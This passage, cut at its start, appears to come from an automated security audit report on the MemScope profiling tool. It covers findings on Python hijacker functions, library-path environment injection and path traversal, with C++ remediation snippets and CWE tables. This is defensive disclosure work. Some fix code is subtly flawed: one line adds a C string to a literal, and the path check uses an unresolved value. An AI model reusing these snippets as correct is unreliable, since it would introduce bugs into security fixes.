    sys.meta_path.insert(0, HiJackerPathFinder())
    cls._initialized = True
```

**达成路径**

HiJackerManager.initialize() -> sys.meta_path.insert(0, HiJackerPathFinder()) -> find_spec interception -> exec_module hooks

**验证说明**: sys.meta_path插入是内部调试工具的设计功能。_modules_of_interest由代码控制而非外部输入。这是预期行为而非漏洞。仅在攻击者能控制Python代码时有风险。

**评分明细**: base: 30 | reachability: 20 | controllability: 0 | mitigations: 0 | context: 0 | cross_file: 0

---

### [SEC-012] Improper Privilege Management - HiJackerWrapperFunction.activate

**严重性**: Low（原评估: High → 验证后: Low） | **CWE**: CWE-266 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: security-auditor

**位置**: `python/msmemscope/hijacker/hijack_utility.py:228-271` @ `HiJackerWrapperFunction.activate`
**模块**: python_hijacker

**描述**: HiJackerWrapperFunction.activate() uses setattr to replace any module's function with a wrapper. Combined with the ability to specify arbitrary module/class/function names, this could be used to hijack critical system functions (e.g., os.system, subprocess.Popen) leading to privilege escalation.

**漏洞代码** (`python/msmemscope/hijacker/hijack_utility.py:228-271`)

```c
def activate(self):
    ...
    setattr(parent_obj, func_name, wrapper)
    ...

def deactivate(self):
    setattr(parent_obj, self.func_name, self.ori_obj)
```

**达成路径**

hijacker(module, cls, function) -> HiJackerWrapperFunction -> activate() -> getattr chain traversal -> setattr(parent_obj, func_name, wrapper)

**验证说明**: setattr劫持是内部调试工具的设计功能。module/cls/function参数来自代码而非用户输入。仅当攻击者能控制Python代码时有风险，可信场景下非真实漏洞。

**评分明细**: base: 30 | reachability: 20 | controllability: 0 | mitigations: 0 | context: 0 | cross_file: 0

---

## 7. Remediation Recommendations

### Priority 1 (High) — SEC-001 & SEC-002 环境变量注入

**问题**: LD_PRELOAD_PATH 和 ASCEND_HOME_PATH 直接控制动态库加载路径

**修复方案**: 实施路径白名单和签名验证

```cpp
// process.cpp - SetPreloadEnv 修改
static const std::set<std::string> ALLOWED_HOOK_DIRS = {
    "/usr/local/lib/msmemscope",
    "/opt/memscope/lib64",
};

void Process::SetPreloadEnv()
{
    string hookLibDir = "/usr/local/lib/msmemscope";  // 硬编码安全路径
    
    char const *preloadPath = getenv("LD_PRELOAD_PATH");
    if (preloadPath != nullptr && !string(preloadPath).empty()) {
        // 验证路径是否在白名单中
        char *resolved = realpath(preloadPath, nullptr);
        if (!resolved) {
            LOG_ERROR("Invalid LD_PRELOAD_PATH");
            return;
        }
        
        std::string resolvedPath(resolved);
        free(resolved);
        
        if (ALLOWED_HOOK_DIRS.find(resolvedPath) == ALLOWED_HOOK_DIRS.end()) {
            LOG_ERROR("LD_PRELOAD_PATH not in allowed directories: %s", resolvedPath.c_str());
            return;
        }
        
        hookLibDir = preloadPath;
    }
    // ...
}

// vallina_symbol.cpp - LibLoad 修改
void *LibLoad(std::string libName)
{
    static const std::set<std::string> ALLOWED_ASCEND_DIRS = {
        "/usr/local/Ascend",
        "/opt/Ascend",
    };
    
    const char *pathEnv = std::getenv("ASCEND_HOME_PATH");
    if (pathEnv && !std::string(pathEnv).empty()) {
        char *resolved = realpath(pathEnv, nullptr);
        if (!resolved) {
            LOG_ERROR("Invalid ASCEND_HOME_PATH");
            return nullptr;
        }
        
        std::string resolvedPath(resolved);
        free(resolved);
        
        if (ALLOWED_ASCEND_DIRS.find(resolvedPath) == ALLOWED_ASCEND_DIRS.end()) {
            LOG_ERROR("ASCEND_HOME_PATH not in allowed directories");
            return nullptr;
        }
        
        std::string libPath = pathEnv + "/lib64/" + libName;
        return dlopen(libPath.c_str(), RTLD_NOW | RTLD_GLOBAL);
    }
    return dlopen(libName.c_str(), RTLD_NOW | RTLD_GLOBAL);
}
```

---

### Priority 2 (Medium) — SEC-010 内存分配上限

**问题**: tensor.dataSize 无上限验证

**修复方案**: 添加合理的内存分配上限

```cpp
// tensor_dumper.cpp
constexpr uint64_t MAX_TENSOR_DUMP_SIZE = 1024 * 1024 * 1024;  // 1GB
constexpr uint64_t MIN_TENSOR_DUMP_SIZE = 1;

bool TensorDumper::DumpOneTensor(const MonitoredTensor& tensor, std::string& fileName)
{
    // 验证 dataSize 在合理范围内
    if (tensor.dataSize > MAX_TENSOR_DUMP_SIZE) {
        LOG_ERROR("Tensor size exceeds maximum limit: %llu > %llu", 
                  tensor.dataSize, MAX_TENSOR_DUMP_SIZE);
        return false;
    }
    if (tensor.dataSize < MIN_TENSOR_DUMP_SIZE) {
        LOG_ERROR("Tensor size is invalid: %llu", tensor.dataSize);
        return false;
    }
    
    // 添加内存分配失败处理
    std::vector<uint8_t> hostData;
    try {
        hostData.resize(tensor.dataSize);
    } catch (const std::bad_alloc& e) {
        LOG_ERROR("Failed to allocate memory for tensor dump: %llu bytes", tensor.dataSize);
        return false;
    }
    
    // ... 继续处理
}
```

---

### Priority 3 (Medium) — SEC-004 路径遍历完善

**问题**: CleanFileName 不处理 `..` 序列

**修复方案**: 完善路径清洗逻辑

```cpp
// tensor_dumper.cpp
void CleanFileName(std::string& fileName)
{
    // 1. 移除所有路径分隔符 (包括 / 和 \)
    for (size_t i = 0; i < fileName.size(); i++) {
        if (fileName[i] == '/' || fileName[i] == '\\') {
            fileName[i] = '_';
        }
    }
    
    // 2. 移除 .. 路径遍历序列
    std::string::size_type pos;
    while ((pos = fileName.find("..")) != std::string::npos) {
        fileName.replace(pos, 2, "__");
    }
    
    // 3. 仅保留安全字符集
    const std::string SAFE_CHARS = 
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    
    std::string cleaned;
    for (char c : fileName) {
        if (SAFE_CHARS.find(c) != std::string::npos) {
            cleaned += c;
        } else {
            cleaned += '_';
        }
    }
    fileName = cleaned;
    
    // 4. 限制长度
    if (fileName.length() > 64) {
        fileName = fileName.substr(0, 64);
    }
}
```

---

### Priority 4 (Medium) — SEC-008/009 Python API 验证

**问题**: PyDict_GetItemString 可能返回 NULL，缺少类型检查

**修复方案**: 完善 NULL 检查和类型验证

```cpp
// msleaksmodule.cpp
static PyObject* MsmemscopeTakeSnapshot(PyObject* self, PyObject* args)
{
    // ...
    
    // 安全提取 device
    PyObject* device_obj = PyDict_GetItemString(memory_info, "device");
    if (!device_obj) {
        PyErr_SetString(PyExc_KeyError, "Missing required key 'device'");
        return nullptr;
    }
    if (!PyLong_Check(device_obj)) {
        PyErr_SetString(PyExc_TypeError, "'device' must be an integer");
        return nullptr;
    }
    snapshot_info.device = PyLong_AsLong(device_obj);
    if (PyErr_Occurred()) {
        return nullptr;
    }
    
    // 安全提取 memory_reserved
    PyObject* reserved_obj = PyDict_GetItemString(memory_info, "memory_reserved");
    if (!reserved_obj) {
        PyErr_SetString(PyExc_KeyError, "Missing required key 'memory_reserved'");
        return nullptr;
    }
    if (!PyLong_Check(reserved_obj)) {
        PyErr_SetString(PyExc_TypeError, "'memory_reserved' must be an integer");
        return nullptr;
    }
    snapshot_info.memory_reserved = PyLong_AsUnsignedLongLong(reserved_obj);
    if (PyErr_Occurred()) {
        return nullptr;
    }
    
    // ... 其他字段类似处理
}
```

```cpp
// watcherobject.cpp
static PyObject* PyMemScopeWatcherWatch(PyObject *self, PyObject *args, PyObject* kwds)
{
    // ...
    
    if (kwds != nullptr) {
        PyObject* nameObj = PyDict_GetItemString(kwds, "name");
        if (!nameObj) {
            PyErr_SetString(PyExc_KeyError, "Missing required parameter 'name'");
            Py_RETURN_NONE;
        }
        if (!PyUnicode_Check(nameObj)) {
            PyErr_SetString(PyExc_TypeError, "'name' must be a string");
            Py_RETURN_NONE;
        }
        
        name = PyUnicode_AsUTF8(nameObj);
        if (!name) {
            PyErr_SetString(PyExc_TypeError, "Failed to parse 'name' as UTF-8");
            Py_RETURN_NONE;
        }
        
        // 添加字符安全检查
        if (ContainsUnsafeChars(name)) {
            PyErr_SetString(PyExc_ValueError, "'name' contains unsafe characters");
            Py_RETURN_NONE;
        }
        
        if (std::strlen(name) > MAX_WATCH_NAME_LENGTH) {
            PyErr_Format(PyExc_ValueError, "Input name exceeds maximum allowed length %zu.", 
                         MAX_WATCH_NAME_LENGTH);
            Py_RETURN_NONE;
        }
        // ...
    }
}

bool ContainsUnsafeChars(const char* name) {
    const std::string UNSAFE = "/\\..";
    for (size_t i = 0; name[i]; i++) {
        if (UNSAFE.find(name[i]) != std::string::npos) {
            return true;
        }
    }
    return false;
}
```

---

### Priority 5 (Low) — SEC-005/006/007/012 设计功能说明

**问题**: 这些漏洞被标记为 POSSIBLE，但验证后发现是设计功能而非安全漏洞

**分析说明**:

| 漏洞 | 验证结论 | 建议 |
|------|----------|------|
| SEC-005 | hijacker stub 参数来自 Python 代码而非用户数据 | 无需修复，添加文档说明设计意图 |
| SEC-006 | sys.meta_path 插入是调试工具的预期行为 | 无需修复，添加文档说明 |
| SEC-007 | MSTX 注入调用者应为可信组件 | 无需修复，但可添加调用者身份验证 |
| SEC-012 | setattr 动态替换是调试功能 | 无需修复，添加文档说明 |

**建议措施**:
- 在文档中明确说明 hijacker 模块的安全使用场景
- 添加 `_initialized` 标志防止重复初始化（已实现）
- 添加 MSTX 调用者身份验证（可选）

---

## 8. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| framework | 0 | 1 | 1 | 0 | 2 |
| kernel_hooks | 0 | 1 | 0 | 0 | 1 |
| memory_watch | 0 | 0 | 2 | 0 | 2 |
| mstx_hooks | 0 | 0 | 1 | 0 | 1 |
| python_hijacker | 0 | 0 | 1 | 2 | 3 |
| python_itf | 0 | 0 | 2 | 0 | 2 |
| **合计** | **0** | **2** | **7** | **2** | **11** |

## 9. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-426 | 3 | 27.3% |
| CWE-20 | 2 | 18.2% |
| CWE-95 | 1 | 9.1% |
| CWE-94 | 1 | 9.1% |
| CWE-822 | 1 | 9.1% |
| CWE-787 | 1 | 9.1% |
| CWE-266 | 1 | 9.1% |
| CWE-22 | 1 | 9.1% |

---

## 10. 附录

### 10.1 参考资料

- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Path Traversal Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html)

### 10.2 扫描方法论

本次扫描采用多 Agent 协作模式：
- **污点追踪**: DataFlow Scanner Agent 分析数据流路径
- **语义分析**: Security Auditor Agent 识别漏洞模式
- **验证评分**: Verification Worker Agent 计算置信度

---

**报告生成时间**: 2026-04-21T04:15:00Z  
**生成者**: Reporter Agent (MindStudio-MemScope Scanner)